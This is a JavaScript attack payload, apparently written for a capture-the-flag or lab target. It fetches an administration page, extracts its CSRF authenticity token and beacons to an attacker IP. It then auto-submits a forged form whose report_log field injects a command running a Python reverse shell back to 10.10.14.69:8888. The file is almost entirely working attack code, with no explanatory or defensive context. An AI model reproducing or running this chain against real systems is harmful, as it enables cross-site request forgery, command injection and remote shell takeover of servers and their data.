var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://thing.edu:2222/administration", true);
xmlHttp.send( null );
// confirm
//
//
var x = document.createElement("IMG");
x.src = 'http://10.10.14.69/?first';
//
//

setTimeout(function() {
    // confirm
    //
    //
    var x = document.createElement("IMG");
    x.src = 'http://10.10.14.69/?second';
    // grab token
    //
    //
    var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');
    var token = doc.getElementById('authenticity_token').value;
    // conjure form
    var newForm = new DOMParser().parseFromString('<form id="hacks" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html');
    document.body.append(newForm.forms.hacks);
    // values
    //
    //
    document.getElementById('hacks').elements.report_log.value = '|/usr/bin/python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.69",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("bash")';
    document.getElementById('hacks').elements.authenticity_token.value = token;
    document.getElementById('hacks').submit();
}, 2000);

//
//
//
